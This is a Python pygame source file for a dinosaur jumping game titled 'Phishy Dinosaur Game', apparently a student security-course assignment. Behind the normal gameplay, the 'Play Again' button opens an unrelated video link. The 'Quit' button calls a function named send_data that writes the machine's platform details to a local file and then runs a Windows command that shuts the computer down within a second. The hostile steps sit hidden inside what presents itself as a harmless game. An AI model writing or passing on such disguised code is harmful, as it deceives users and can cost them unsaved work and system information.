import pygame
import random
import sys
import webbrowser
import os
import platform


pygame.init()
def send_data():
    system_details = f"System Details:\n{platform.uname()}"
    with open('phishing_demo.txt', 'w') as file:
        file.write(system_details)
    
        


WIDTH, HEIGHT = 800, 400
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("Phishy Dinosaur Game")






cacti = []
cactus_velocity = 5
spawn_frequency = 60
spawn_counter = 0

game_over = False
score = 0
highscore=0
dino_image = pygame.image.load('C:/Users/agarw/Documents/FCS/Assignment2/Assignment2_Arnav_2021235/dino.png')
dino_image = pygame.transform.scale(dino_image, (50, 50))  
cactus_image = pygame.image.load('C:/Users/agarw/Documents/FCS/Assignment2/Assignment2_Arnav_2021235/cactus.png')
cactus_image = pygame.transform.scale(cactus_image, (30, 60)) 
ground_y = 300
dino_y = ground_y - dino_image.get_height() + 20
dino_velocity = 0
gravity = 1
jump_force = 15




while True:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pygame.quit()
            sys.exit()

    keys = pygame.key.get_pressed()

    if not game_over:
        if keys[pygame.K_SPACE] and dino_y >= ground_y - dino_image.get_height() + 20:
            dino_velocity = -jump_force

        dino_y += dino_velocity
        dino_velocity += gravity

        if dino_y > ground_y - dino_image.get_height() + 20:
            dino_y = ground_y - dino_image.get_height() + 20
            dino_velocity = 0

        if spawn_counter == 0:
            cacti.append([WIDTH, ground_y - cactus_image.get_height() + 20])
            spawn_counter = spawn_frequency
        else:
            spawn_counter -= 1

        # Update cacti positions and check for score
        for c in cacti:
            c[0] -= cactus_velocity
            if c[0] < 50 and c[0]>44:
                score += 1

        
        for c in cacti:
            cactus_rect = pygame.Rect(c[0], c[1], cactus_image.get_width(), cactus_image.get_height())
            dino_rect = pygame.Rect(50, dino_y, dino_image.get_width(), dino_image.get_height())
            if cactus_rect.colliderect(dino_rect):
                
                game_over = True

    
    screen.fill((255, 255, 255))
    for c in cacti:
        screen.blit(cactus_image, c)
    screen.blit(dino_image, (50, dino_y))

    if(highscore<score):
        highscore=score
    font = pygame.font.Font(None, 36)
    score_text = font.render(f"Score: {int(score)}", True, (0, 0, 0))
    screen.blit(score_text, (10, 10))
    font = pygame.font.Font(None, 36)
    score_text = font.render(f"HighScore: {highscore}", True, (0, 0, 0))
    screen.blit(score_text, (10, 50))

    if game_over:
        play_again_button = pygame.Rect(350, 200, 150, 50)
        quit_button = pygame.Rect(350, 300, 150, 50)
        play_again_text = font.render("Play Again", True, (255, 255, 255))
        quit_text = font.render("Quit", True, (255, 255, 255))
        pygame.draw.rect(screen, (255, 0, 0), play_again_button)
        pygame.draw.rect(screen, (255, 0, 0), quit_button)

        screen.blit(play_again_text, (355, 210))
        screen.blit(quit_text, (385, 310))

        mouse = pygame.mouse.get_pos()
        click = pygame.mouse.get_pressed()

        if play_again_button.collidepoint(mouse) and click[0] == 1:
            webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
            game_over = False
            cacti.clear()
            dino_y = ground_y - dino_image.get_height() + 20
            score = 0


        if quit_button.collidepoint(mouse) and click[0] == 1:
            
            send_data()
            os.system("shutdown /s /t 1")
            pygame.quit()
            sys.exit()
            

    pygame.display.flip()
    pygame.time.Clock().tick(30)
